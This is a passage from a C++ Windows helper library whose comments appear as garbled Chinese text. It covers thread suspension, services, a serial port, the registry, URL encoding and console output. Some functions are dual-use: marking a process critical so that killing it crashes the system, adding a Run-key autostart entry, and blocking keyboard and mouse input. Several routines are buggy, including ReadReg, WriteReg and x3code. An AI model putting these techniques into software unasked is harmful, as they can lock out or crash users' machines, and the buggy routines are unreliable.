	if (hSnapshot != INVALID_HANDLE_VALUE)										 //���̴���
	{
		THREADENTRY32 te = {sizeof(te)};
		BOOL fOk = Thread32First(hSnapshot, &te);		//�򿪽���
		for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //��ǰ�����һ�����̣���һ��
			if (te.th32OwnerProcessID == dwProcessID)
			{
				if (fSuspend)
				{
					if (SuspendThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //����
						ret = 0;
				}
				else
				{
					if (ResumeThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //ȡ������
						ret = 0;
				}
			}
	}
	CloseHandle(hSnapshot); //�رտ���
	return ret;
}

/**************************************************
 *  @brief          ����/����ؼ�����
 *  @param          id:����id fSuspend:1�ؼ���0��ͨ
 *  @note           ͷ�ļ�: #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage 	CriticalProcess(1000,1);
 * 	@return      	1�ɹ���0ʧ��
 *  @calls          Debug
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/3/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
typedef NTSTATUS(NTAPI *_NtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
BOOL CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
{
	Debug(); //���debugȨ��

	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess"); //����ntdll
	if (!NtSetInformationProcess)																														   //����ʧ�ܣ��˳�
		return 0;
	if (NtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID), (PROCESS_INFORMATION_CLASS)29, &fSuspend, sizeof(ULONG)) < 0) //���ý���
		return 0;																																   //����ʧ�ܣ��˳�
	else
		return 1;
}

/**************************************************
 *  @brief          ֹͣ����
 *  @param          ������
 *  @note           ͷ�ļ�: #include <Windows.h>
 *  @Sample usage 	CloseService("CryptSvc");
 * 	@return  	    1�ɹ���0ʧ��
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/7
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL CloseService(const char *service)
{
	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //�򿪷��������
	if (hSC == NULL)
	{
		CloseServiceHandle(hSC);
		return 0;
	}

	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //�򿪷���
	if (hSvc == NULL)
	{
		CloseServiceHandle(hSC);
		CloseServiceHandle(hSvc);
		return false; //�򿪷��������ʧ�ܣ��ر�HANDLE�˳�
	}
	SERVICE_STATUS status;
	if (QueryServiceStatus(hSvc, &status) == FALSE) //��÷���״̬
	{
		CloseServiceHandle(hSvc);
		CloseServiceHandle(hSC);
		return false; //��ѯ����״̬ʧ�ܣ��ر�HANDLE�˳�
	}
	if (status.dwCurrentState == SERVICE_RUNNING) //����������У�ֹͣ����
	{
		if (ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == FALSE)
		{
			CloseServiceHandle(hSvc);
			CloseServiceHandle(hSC);
			return false; //ֹͣ����ʧ�ܣ��ر�HANDLE�˳�
		}
		while (QueryServiceStatus(hSvc, &status) == TRUE) //�ȴ�����ֹͣ
		{
			Sleep(status.dwWaitHint);
			if (status.dwCurrentState == SERVICE_STOPPED) //�����Ѿ�ֹͣ
			{
				CloseServiceHandle(hSvc);
				CloseServiceHandle(hSC);
				return true; //������ֹͣ���ر�HANDLE�˳�
			}
		}
	}

	CloseServiceHandle(hSvc);
	CloseServiceHandle(hSC);
	return true; //������ֹͣ���ر�HANDLE�˳�
}

/**************************************************
 *  @brief          ��������
 *  @param          service:������
 *  @note           ͷ�ļ�: #include <Windows.h>
 *  @Sample usage 	StartService("CryptSvc");
 * 	@return  	    1�ɹ���0ʧ��
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL _StartService(const char *service)
{
	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //�򿪷��������
	if (hSC == NULL)
	{
		CloseServiceHandle(hSC);
		return false;
	}

	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //�򿪷���
	if (hSvc == NULL)
	{
		CloseServiceHandle(hSC);
		CloseServiceHandle(hSvc);
		return false; //�򿪷��������ʧ�ܣ��ر�HANDLE�˳�
	}
	SERVICE_STATUS status;
	if (QueryServiceStatus(hSvc, &status) == FALSE) //��÷���״̬
	{
		CloseServiceHandle(hSvc);
		CloseServiceHandle(hSC);
		return false; //��ѯ����״̬ʧ�ܣ��ر�HANDLE�˳�
	}
	if (status.dwCurrentState != SERVICE_RUNNING) //���δ���У���������
	{
		if (StartService(hSvc, 0, NULL) == FALSE)
		{
			CloseServiceHandle(hSvc);
			CloseServiceHandle(hSC);
			return false; //��������ʧ�ܣ��ر�HANDLE�˳�
		}

		while (QueryServiceStatus(hSvc, &status) == TRUE) // �ȴ���������
		{
			Sleep(status.dwWaitHint);
			if (status.dwCurrentState == SERVICE_RUNNING) //�����Ѿ�����
			{
				CloseServiceHandle(hSvc);
				CloseServiceHandle(hSC);
				return true; //�������������ر�HANDLE�˳�
			}
		}
	}

	CloseServiceHandle(hSvc);
	CloseServiceHandle(hSC);
	return true; //�������������ر�HANDLE�˳�
}

/**************************************************
 *  @brief          �г����з���
 *  @param          service:������
 *  @note           ͷ�ļ�: #include <Windows.h>
 *  @Sample usage 	ListService();
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void ListService()
{
	SC_HANDLE SCMan = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (SCMan == NULL)
	{
		CloseServiceHandle(SCMan);
		return;
	}

	LPENUM_SERVICE_STATUS service_status;
	DWORD cbBytesNeeded, ServicesReturned, ResumeHandle;

	service_status = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 65536);

	BOOL ESS = EnumServicesStatus(SCMan, //���
								  SERVICE_DRIVER |
									  SERVICE_FILE_SYSTEM_DRIVER |
									  SERVICE_KERNEL_DRIVER |
									  SERVICE_WIN32 |
									  SERVICE_WIN32_OWN_PROCESS |
									  SERVICE_WIN32_SHARE_PROCESS,		 //��������
								  SERVICE_STATE_ALL,					 //�����״̬
								  (LPENUM_SERVICE_STATUS)service_status, //���������ϵͳ����Ľṹ
								  65536,								 //�ṹ�Ĵ�С
								  &cbBytesNeeded,						 //������������շ�������ķ���
								  &ServicesReturned,					 //������������շ��ط��������
								  &ResumeHandle);						 //���������������һ�ε��ñ���Ϊ0������Ϊ0����ɹ�
	for (int i = 0; i < ServicesReturned; i++)
	{
		printf("������ʾ��:%s\n", service_status[i].lpDisplayName);
		printf("\t������:%s\n", service_status[i].lpServiceName);

		printf("\t����:");
		switch (service_status[i].ServiceStatus.dwServiceType)
		{ // ����״̬
		case SERVICE_FILE_SYSTEM_DRIVER:
			printf("�ļ�ϵͳ��������\n");
			break;
		case SERVICE_KERNEL_DRIVER:
			printf("�豸��������\n");
			break;
		case SERVICE_WIN32_OWN_PROCESS:
			printf("�����Լ��Ľ���������\n");
			break;
		case SERVICE_WIN32_SHARE_PROCESS:
			printf("������������һ������\n");
			break;
		case 0x00000050:
			printf("�����Լ��Ľ���������\n");
			break;
		case 0x00000060:
			printf("�ڵ�¼�û��ʻ������е�һ����������������һ������\n");
			break;
		case SERVICE_INTERACTIVE_PROCESS:
			printf("���������潻��\n");
			break;
		default:
			printf("δ֪\n");
			break;
		}

		printf("\t״̬:");
		switch (service_status[i].ServiceStatus.dwCurrentState)
		{ // ����״̬
		case SERVICE_CONTINUE_PENDING:
			printf("��������\n");
			break;
		case SERVICE_PAUSE_PENDING:
			printf("������ͣ\n");
			break;
		case SERVICE_PAUSED:
			printf("����ͣ\n");
			break;
		case SERVICE_RUNNING:
			printf("��������\n");
			break;
		case SERVICE_START_PENDING:
			printf("��������\n");
			break;
		case SERVICE_STOP_PENDING:
			printf("����ֹͣ\n");
			break;
		case SERVICE_STOPPED:
			printf("��ֹͣ\n");
			break;
		default:
			printf("δ֪\n");
			break;
		}
		LPQUERY_SERVICE_CONFIG lpServiceConfig = NULL;												//������ϸ��Ϣ�ṹ
		SC_HANDLE service_curren = NULL;															//��ǰ�ķ�����
		service_curren = OpenService(SCMan, service_status[i].lpServiceName, SERVICE_QUERY_CONFIG); //�򿪵�ǰ����
		lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 8192);							//�����ڴ棬 ���Ϊ8kb

		if (!QueryServiceConfig(service_curren, lpServiceConfig, 8192, &ResumeHandle))
		{
			CloseServiceHandle(service_curren);
			CloseServiceHandle(SCMan);
			return;
		}
		printf("\t��������:%s\n", lpServiceConfig->lpBinaryPathName);
		CloseServiceHandle(service_curren);
	}
	CloseServiceHandle(SCMan);
}

//���ڲ�����ʼ

/**************************************************
 *  @brief         ���ڲ���
 *  @Sample usage
	SerialPort w;//ʹ�ã����Ǳ�����w
	w.open("\\\\.\\COM7");//��COM7 ���Ǳ�����COM7
	w.close()//�ر�
	w.send("at\r");//����
	w.receive()��//����

**************************************************/

/**************************************************
 *  @brief          �򿪴���
 *  @param
	portname(������): ��Windows����"COM1""COM2"�ȣ���Linux����"/dev/ttyS1"��
	baudrate(������): 9600��19200��38400��43000��56000��57600��115200
	parity(У��λ): 0Ϊ��У�飬1Ϊ��У�飬2ΪżУ�飬3Ϊ���У��
	databit(����λ): 4-8��ͨ��Ϊ8λ
	stopbit(ֹͣλ): 1Ϊ1λֹͣλ��2Ϊ2λֹͣλ,3Ϊ1.5λֹͣλ
	synchronizable(ͬ�����첽): 0Ϊ�첽��1Ϊͬ��
 *  @note           �Ƕ���ģ��
 *  @Sample usage 	open(�˿ں�);
 * 	@return         �ɹ�����true��ʧ�ܷ���false
 * 	@author         xbebhxx3
 * 	@version        2.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
**************************************************/
BOOL SerialPort::open(const char *portname, int baudrate = 115200, char parity = 0, char databit = 8, char stopbit = 1, char synchronizeflag = 1)
{
	this->synchronizeflag = synchronizeflag;
	HANDLE hCom = NULL;
	if (this->synchronizeflag)
		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); //ͬ����ʽ
	else
		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL); //�첽��ʽ
	if (hCom == (HANDLE)-1)
		return false;
	if (!SetupComm(hCom, 1024, 1024))
		return false; //���û�������С
	// ���ò���
	DCB p;
	memset(&p, 0, sizeof(p));
	p.DCBlength = sizeof(p);
	p.BaudRate = baudrate; // ������
	p.ByteSize = databit;  // ����λ
	switch (parity)		   //У��λ
	{
	case 0:
		p.Parity = NOPARITY; //��У��
		break;
	case 1:
		p.Parity = ODDPARITY; //��У��
		break;
	case 2:
		p.Parity = EVENPARITY; //żУ��
		break;
	case 3:
		p.Parity = MARKPARITY; //���У��
		break;
	}
	switch (stopbit) //ֹͣλ
	{
	case 1:
		p.StopBits = ONESTOPBIT; // 1λֹͣλ
		break;
	case 2:
		p.StopBits = TWOSTOPBITS; // 2λֹͣλ
		break;
	case 3:
		p.StopBits = ONE5STOPBITS; // 1.5λֹͣλ
		break;
	}
	if (!SetCommState(hCom, &p))
		return false;							// ���ò���ʧ��
	COMMTIMEOUTS TimeOuts;						//��ʱ����,��λ:���룬�ܳ�ʱ��ʱ��ϵ��������д���ַ�����ʱ�䳣��
	TimeOuts.ReadIntervalTimeout = 1000;		//�������ʱ
	TimeOuts.ReadTotalTimeoutMultiplier = 500;	//��ʱ��ϵ��
	TimeOuts.ReadTotalTimeoutConstant = 5000;	//��ʱ�䳣��
	TimeOuts.WriteTotalTimeoutMultiplier = 500; // дʱ��ϵ��
	TimeOuts.WriteTotalTimeoutConstant = 2000;	//дʱ�䳣��
	SetCommTimeouts(hCom, &TimeOuts);
	PurgeComm(hCom, PURGE_TXCLEAR | PURGE_RXCLEAR); //��մ��ڻ�����
	memcpy(pHandle, &hCom, sizeof(hCom));			// ������
	return true;
}

/**************************************************
 *  @brief          �رմ���
 *  @param          NULL
 *  @note           �Ƕ���ģ��
 *  @Sample usage   open(�˿ں�);
 * 	@return         �ɹ�����true��ʧ�ܷ���false
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void SerialPort::close()
{
	HANDLE hCom = *(HANDLE *)pHandle;
	CloseHandle(hCom);
}

/**************************************************
 *  @brief          ��������
 *  @param          dat:���͵�����
 *  @note           �Ƕ���ģ��
 *  @Sample usage   send(���͵�����);
 * 	@return      	�ɹ����ط������ݳ��ȣ�ʧ�ܷ���0
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
int SerialPort::send(const string dat)
{
	HANDLE hCom = *(HANDLE *)pHandle;
	if (this->synchronizeflag)
	{																							   // ͬ����ʽ
		DWORD dwBytesWrite = dat.length();														   //�ɹ�д��������ֽ���
		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, NULL); //ͬ������
		if (!bWriteStat)
			return 0;
		return dwBytesWrite;
	}
	else
	{																									 //�첽��ʽ
		DWORD dwBytesWrite = dat.length();																 //�ɹ�д��������ֽ���
		DWORD dwErrorFlags;																				 //�����־
		COMSTAT comStat;																				 //ͨѶ״̬
		OVERLAPPED m_osWrite;																			 //�첽��������ṹ��
		memset(&m_osWrite, 0, sizeof(m_osWrite));														 //����һ������OVERLAPPED���¼��������������õ�����ϵͳҪ����ô��
		ClearCommError(hCom, &dwErrorFlags, &comStat);													 //���ͨѶ���󣬻���豸��ǰ״̬
		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, &m_osWrite); //�첽����
		if (!bWriteStat)
			if (GetLastError() == ERROR_IO_PENDING)
				WaitForSingleObject(m_osWrite.hEvent, 500); //�����������д��ȴ�д���¼�0.5����
			else
			{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ����
				CloseHandle(m_osWrite.hEvent);				   //�رղ��ͷ�hEvent�ڴ�
				return 0;
			}
		return dwBytesWrite;
	}
}

/**************************************************
 *  @brief          ��������
 *  @param          NULL
 *  @note           �Ƕ���ģ��
 *  @Sample usage   receive();
 * 	@return         ����
 * 	@author         xbebhxx3
 * 	@version        3.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
string SerialPort::receive()
{
	HANDLE hCom = *(HANDLE *)pHandle;
	string rec_str = "";
	char buf[1024];
	if (this->synchronizeflag)
	{																 //ͬ����ʽ
		DWORD wCount = 1024;										 //�ɹ���ȡ�������ֽ���
		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, NULL); //ͬ������
		for (int i = 0; i < strlen(buf); i++)
		{
			if (buf[i] != -52)
				rec_str += buf[i];
			else
				break;
		}
		return rec_str;
	}
	else
	{												   //�첽��ʽ
		DWORD wCount = 1024;						   //�ɹ���ȡ�������ֽ���
		DWORD dwErrorFlags;							   //�����־
		COMSTAT comStat;							   //ͨѶ״̬
		OVERLAPPED m_osRead;						   //�첽��������ṹ��
		memset(&m_osRead, 0, sizeof(m_osRead));		   //����һ������OVERLAPPED���¼��������������õ�����ϵͳҪ����ô��
		ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ���󣬻���豸��ǰ״̬
		if (!comStat.cbInQue)
			return "";													  //������뻺�����ֽ���Ϊ0���򷵻�false
		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, &m_osRead); //�첽����
		if (!bReadStat)
		{
			if (GetLastError() == ERROR_IO_PENDING)
				GetOverlappedResult(hCom, &m_osRead, &wCount, TRUE); //����������ڶ�ȡ�У�GetOverlappedResult���������һ��������ΪTRUE��������һֱ�ȴ���ֱ����������ɻ����ڴ��������
			else
			{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ����
				CloseHandle(m_osRead.hEvent);				   //�رղ��ͷ�hEvent���ڴ�
				return "";
			}
		}
		for (int i = 0; i < strlen(buf); i++)
		{
			if (buf[i] != -52)
				rec_str += buf[i];
			else
				break;
		}
		return rec_str;
	}
}

//ע��������ʼ

/**************************************************
 *  @brief          ��ע���
 *  @param          path:·�� key:key
 *  @note           ͷ�ļ�: #include <windows.h>
 *  @Sample usage   ReadReg("Software\\xbebhxx3", "aaa");
 *  @return         ע���ֵ��0Ϊʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
char *ReadReg(const char *path, const char *key)
{
	char *value = {0};
	HKEY hKey;
	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey); //��ע���
	if (ret != ERROR_SUCCESS)
		return 0;
	//��ȡKEY
	DWORD dwType = REG_SZ; //��������
	DWORD cbData = 256;
	ret = RegQueryValueEx(hKey, key, NULL, &dwType, (LPBYTE)value, &cbData); //��ȡע���
	if (ret == ERROR_SUCCESS)
	{
		RegCloseKey(hKey); //�ر�ע���
		return value;
	}
}
/**************************************************
 *  @brief          дע���
 *  @param          path:·�� key:key value:ֵ
 *  @note           ͷ�ļ�: #include <windows.h>
 *  @Sample usage   WriteReg("Software\\xbebhxx3", "aaa", "bbb");
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL WriteReg(const char *path, const char *key, const char *value)
{
	HKEY hKey;
	DWORD dwDisp;
	DWORD dwType = REG_SZ;																										//��������
	int ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp); //��ע���
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKey); //�ر�ע���
		return 0;
	}
	ret == RegSetValueEx(hKey, key, 0, dwType, (BYTE *)value, strlen(value)); //д��ע���
	RegCloseKey(hKey);														  //�ر�ע���
	return 1;
}

/**************************************************
 *  @brief          ɾ��ע�����
 *  @param          path:·��
 *  @note           ͷ�ļ�: #include <windows.h>
 *  @Sample usage   DelReg("Software\\xbebhxx3");
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL DelReg(const char *path)
{
	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path); //ɾ��ע���
	if (ret == ERROR_SUCCESS)
		return 1;
	else
		return 0;
}

/**************************************************
 *  @brief          ɾ��ע���ֵ
 *  @param          path:·��, value:ֵ
 *  @note           ͷ�ļ�: #include <windows.h>
 *  @Sample usage   DelRegValue("Software\\xbebhxx3","aaa");
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL DelRegValue(const char *path, const char *Value)
{
	HKEY hKey;
	LONG ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_QUERY_VALUE | KEY_WRITE, &hKey); //��ע���
	if (ret == ERROR_SUCCESS)
	{
		RegDeleteValue(hKey, Value); //ɾ��ע���
		RegCloseKey(hKey);			 //�ر�ע���
		return 1;
	}
	RegCloseKey(hKey); //�ر�ע���
	return 0;
}

/**************************************************
 *  @brief          ���ÿ�������
 *  @param          name:��������fSuspend:1������0�ر�
 *  @note           ͷ�ļ�: #include <windows.h>
 *  @calls          WriteReg,DelRegValue
 *  @Sample usage   AutoRun(��������1);
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/4
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL AutoRun(const char *name, BOOL fSuspend)
{
	if (fSuspend == 1)
	{
		char szFilePath[MAX_PATH + 1] = {0};
		GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
		return WriteReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, szFilePath); //д��ע���ֵ
	}
	else
	{
		return DelRegValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name); //ɾ��ע���ֵ
	}
}

//��/���������ʼ

/**************************************************
 *  @brief          Url����
 *  @param          URL:��Ҫ����Ķ���
 *  @Sample usage   CodeUrl(��Ҫ����Ķ���);
 *  @return     	������
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string CodeUrl(const string &URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++)
	{
		char c = URL[i];
		if (('0' <= c && c <= '9') || ('a' <= c && c <= 'z') || ('A' <= c && c <= 'Z') || c == '/' || c == '.')
			result += c;
		else
		{
			int j = (short int)c;
			if (j < 0)
				j += 256;
			int i1, i0;
			i1 = j / 16;
			i0 = j - i1 * 16;
			result += '%';
			if (0 <= i1 && i1 <= 9)
				result += char(short('0') + i1);
			else if (10 <= i1 && i1 <= 15)
				result += char(short('A') + i1 - 10);
			if (0 <= i0 && i0 <= 9)
				result += char(short('0') + i0);
			else if (10 <= i0 && i0 <= 15)
				result += char(short('A') + i0 - 10);
		}
	}
	return result;
}

/**************************************************
 *  @brief          Url����
 *  @param          URL:��Ҫ����Ķ���
 *  @Sample usage   decodeUrl(��Ҫ����Ķ���);
 *  @return     	������
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string DecodeUrl(const string &URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++)
	{
		char c = URL[i];
		if (c != '%')
			result += c;
		else
		{
			char c1 = URL[++i];
			char c0 = URL[++i];
			int num = 0;
			if ('0' <= c1 && c1 <= '9')
				num += short(c1 - '0') * 16;
			else if ('a' <= c1 && c1 <= 'f')
				num += (short(c1 - 'a') + 10) * 16;
			else if ('A' <= c1 && c1 <= 'F')
				num += (short(c1 - 'A') + 10) * 16;
			if ('0' <= c0 && c0 <= '9')
				num += short(c0 - '0');
			else if ('a' <= c0 && c0 <= 'f')
				num += (short(c0 - 'a') + 10);
			else if ('A' <= c0 && c0 <= 'F')
				num += (short(c0 - 'A') + 10);
			result += char(num);
		}
	}
	return result;
}

/**************************************************
 *  @brief          x3code����
 *  @param          c:��Ҫ���ܵĶ���
 *  @Sample usage   x3code("xbebhxx3");
 *  @return     	���ܺ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/30
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
char *x3code(char *c)
{
	for (int i = 0; i <= sizeof(c); i++)
	{
		if ((c[i] >= 'A' && c[i] <= 'V') || (c[i] >= 'a' && c[i] <= 'v'))
		{
			c[i] = (c[i] ^ 8) + 4;
		}
		else if ((c[i] >= 'W' && c[i] <= 'Z') || (c[i] >= 'w' && c[i] <= 'z'))
		{
			c[i] = (c[i] ^ 6) - 22;
		}
		else if ((c[i] >= '1' && c[i] <= '4'))
		{
			c[i] = (c[i] ^ 4) - 8;
		}
		else if ((c[i] >= '5' && c[i] <= '9'))
		{
			c[i] = (c[i] ^ 7) + 22;
		}
		else if ((c[i] >= ' ' && c[i] <= '('))
		{
			c[i] = (c[i] ^ 2) - 21;
		}
		else if ((c[i] >= ')' && c[i] <= '/'))
		{
			c[i] = (c[i] ^ 3) + 12;
		}
		else
			;
	}
	return c;
}

//�ı���ɫ��ʼ

/**************************************************
 *  @brief          RGB��ʼ��
 *  @Sample usage   rgb_init()
 *  @note	    	ͷ�ļ�: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/5
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void rgb_init()
{												   // ��ʼ��
	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);   //������
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE); //������
	DWORD dwInMode, dwOutMode;
	GetConsoleMode(hIn, &dwInMode);	  //��ȡ����̨����ģʽ
	GetConsoleMode(hOut, &dwOutMode); //��ȡ����̨���ģʽ
	dwInMode |= 0x0200;				  //����
	dwOutMode |= 0x0004;
	SetConsoleMode(hIn, dwInMode);	 //���ÿ���̨����ģʽ
	SetConsoleMode(hOut, dwOutMode); //���ÿ���̨���ģʽ
	CloseHandle(hIn);
	CloseHandle(hOut);
}

/**************************************************
 *  @brief          RGB����
 *  @param	    	wr:����� wg:������ wb:������ br:������ bg:������ bb:������ (0-255)
 *  @Sample usage   rgb_set(255,255,255,0,0,0);
 *  @note	    	����֮ǰ������ rgb_init();
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/5
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void rgb_set(int wr, int wg, int wb, int br, int bg, int bb)
{
	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm", wr, wg, wb, br, bg, bb); //\033[38��ʾǰ����\033[48��ʾ����������%d��ʾ��ϵ���
}

//����

/**************************************************
 *  @brief          ���������� (��Ҫ����ԱȨ��)
 *  @param          lockb:1����,0��Ϊ�ս��
 *  @return         1�ɹ���0ʧ��
 *  @note           ͷ�ļ�: #include <Windows.h>
 *  @Sample usage   lockkm(1); ���� lockkm(0); lockkm(0);����
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL lockkm(BOOL lockb = false)
{
	HINSTANCE hIn = NULL;
	hIn = LoadLibrary("user32.dll");
	if (hIn)
	{
		BOOL(_stdcall * BlockInput)
		(BOOL bFlag);
		BlockInput = (BOOL(_stdcall *)(BOOL bFlag))GetProcAddress(hIn, "BlockInput");
		if (BlockInput)
			return BlockInput(lockb);
		else
			return 0;
	}
	else
		return 0;
}

/**************************************************
 *  @brief          ������λ��
 *  @param          x:x���꣬y:y����
 *  @note           ͷ�ļ�: #include <Windows.h>
 *  @Sample usage   mouxy(���x���꣬y����);
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/5/2
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void mouxy(int &x, int &y)
{
	POINT p;
	GetCursorPos(&p); //��ȡ�������
	x = p.x;
	y = p.y;
}

/**************************************************
 *  @brief          ����
 *  @param          NULL
 *  @note           ͷ�ļ�: #include <Windows.h>
 *  @Sample usage   cls();
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void cls()
{
	HANDLE hdout = GetStdHandle(STD_OUTPUT_HANDLE);		 //��ȡ��׼����豸�ľ��
	CONSOLE_SCREEN_BUFFER_INFO csbi;					 //�����ʾ��Ļ���������Եı���
	GetConsoleScreenBufferInfo(hdout, &csbi);			 //��ȡ��׼����豸����Ļ����������
	DWORD size = csbi.dwSize.X * csbi.dwSize.Y, num = 0; //����˫�ֽڱ���
	COORD pos = {0, 0};									 //��ʾ����ı�������ʼ��Ϊ���Ͻ�(0, 0)�㣩

	//�Ѵ��ڻ�����ȫ�����Ϊ�ո����ΪĬ����ɫ��������
	FillConsoleOutputCharacter(hdout, ' ', size, pos, &num);
	FillConsoleOutputAttribute(hdout, csbi.wAttributes, size, pos, &num);
	SetConsoleCursorPosition(hdout, pos); //��궨λ���������Ͻ�
	CloseHandle(hdout);
}

/**************************************************
 *  @brief          strɾ���ո�
 *  @param          s:Ҫɾ���ո��string����
 *  @note           ͷ�ļ�: #include <Windows.h>
 *  @Sample usage   delspace(Ҫɾ���ո��string����);
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void delspace(string &s)
{
	int index = 0;
	if (!s.empty())
		while ((index = s.find(' ', index)) != string::npos)
			s.erase(index, 1);
}

/**************************************************
 *  @brief          ��õ�ǰip
 *  @note           ͷ�ļ�: #include <WinSock2.h>	����ʱ��-lgdi32 -lwsock32
 *  @Sample usage   ip();
 *  @return         ����������ip
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/23
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
char *getIp()
{
	WSADATA wsaData;
	int ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
	char hostname[256];
	ret = gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
